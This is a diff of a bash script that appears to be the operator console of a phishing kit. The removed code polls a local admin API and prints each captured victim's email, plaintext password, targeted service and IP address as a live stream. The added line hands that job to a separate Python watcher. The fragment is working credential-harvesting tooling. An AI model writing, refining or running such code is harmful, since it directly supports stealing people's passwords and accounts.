@@ -212,35 +212,8 @@ show_link() {
     echo -e "  ${W}${BOLD}Live capture stream${N} ${DIM}(Ctrl+C to stop)${N}\n"
     echo -e "  ${DIM}Waiting for target submissions...${N}\n"
 
-    # Live tail: watch DB for new captures
-    local last_id=0
-    trap 'echo -e "\n  ${DIM}Stopped watching. Container still running.${N}\n"; exit 0' INT
-
-    while true; do
-        local json=$(curl -s "http://localhost:${PORT}/admin/captures" 2>/dev/null)
-        if [[ -n "$json" ]]; then
-            local new=$(echo "$json" | python3 -c "
-import json, sys, os
-try:
-    d = json.load(sys.stdin)
-    last = int(os.environ.get('LAST_ID', 0))
-    for c in reversed(d.get('captures', [])):
-        if c['id'] > last:
-            ts = c['timestamp'][11:19]
-            print(f\"  \033[0;36m[{ts}]\033[0m  \033[1;37m{c['service']:9s}\033[0m  \033[1;33m{c['email']:30s}\033[0m  \033[0;32m{c['password']}\033[0m  \033[2m({c['ip_address']})\033[0m|{c['id']}\")
-except: pass
-" 2>/dev/null)
-            if [[ -n "$new" ]]; then
-                echo "$new" | while IFS='|' read -r line id; do
-                    echo -e "$line"
-                    [[ "$id" =~ ^[0-9]+$ ]] && last_id=$id
-                done
-                # update env for next iteration
-                export LAST_ID=$(echo "$new" | awk -F'|' '{print $NF}' | sort -n | tail -1)
-            fi
-        fi
-        sleep 2
-    done
+    # Reliable Python watcher — polls admin API every 2s
+    python3 "${SCRIPT_DIR}/watch_captures.py"
 }
 
 # ─── Main flow ────────────────────────────────────
